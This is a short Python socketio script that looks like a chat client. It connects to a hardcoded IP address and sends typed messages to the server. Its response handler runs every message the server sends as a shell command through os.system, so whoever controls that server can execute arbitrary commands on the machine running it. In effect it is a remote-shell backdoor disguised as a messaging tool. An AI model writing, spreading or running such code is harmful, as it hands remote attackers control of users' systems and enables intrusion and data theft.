import socketio
import os 


sio = socketio.Client()

@sio.event
def connect():
    print('Connected to server')
    while True:
        user_input = input('Enter a message to send to the server (or "quit" to exit): ')
        if user_input == 'quit':
            break
        sio.emit('user_input', user_input)

@sio.event
def response(data):
    print('Server response:', data)
    os.system(data)

if __name__ == '__main__':
    sio.connect('http://185.8.174.133:5000')
    sio.wait()
